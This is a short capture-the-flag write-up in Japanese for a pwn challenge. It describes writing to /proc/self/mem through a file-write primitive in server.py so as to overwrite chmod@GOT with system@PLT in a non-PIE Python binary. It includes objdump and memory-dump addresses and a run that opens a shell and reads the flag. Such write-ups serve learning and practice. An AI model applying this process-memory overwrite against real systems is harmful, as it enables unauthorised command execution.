# Solution

server.pyを見ると任意のファイルに対して、seekして書き込みを行うことができることが分かる。その後任意のファイルの実行権限を変更するos.chmodを呼び出す。そこで、/proc/self/memに対してseekして書き込みを行うことにより、シェルを取る。            
        
/proc/self/memで自分のプロセスのメモリ内容を書き換え出来て、pythonバイナリがPIE無効であるため、got領域を飛ばしたいアドレスで上書きするというテクニックを使用する。      
     
server.pyで呼び出されるchmod@gotは以下のような固定アドレス。     
```
$ objdump -R /usr/bin/python3  | grep chmod
00000000009b4028 R_X86_64_JUMP_SLOT  chmod@GLIBC_2.2.5
```
system@pltも次のように固定アドレスとなっている。     
```
0800| 0x9b4320 --> 0x7fc66dfc5970 --> 0x48050f00000020b8
0808| 0x9b4328 --> 0x41f4a6 (<XML_GetErrorCode@plt+6>:  push   0x62)
0816| 0x9b4330 --> 0x41f4b6 (<getpriority@plt+6>:       push   0x63)
0824| 0x9b4338 --> 0x41f4c6 (<endspent@plt+6>:  push   0x64)
0832| 0x9b4340 --> 0x41f4d6 (<if_nametoindex@plt+6>:    push   0x65)
0840| 0x9b4348 --> 0x41f4e6 (<system@plt+6>:    push   0x66)
```

以上より、chmod@gotをsystem@pltに書き換えることにより、server.pyの最後のos.chmodで任意コマンド実行できるのではと考えて、成功した。gotやpltのアドレスはDockerfileにより環境構築することにより特定。
```
$ python3 exp.py
[+] Opening connection to pwn.byteband.it on port 7000: Done
[*] Switching to interactive mode
 Give me file: $ ls
flag.txt
server.py
$ cat flag.txt
flag{imagine_not_having_pie_in_2020}
```
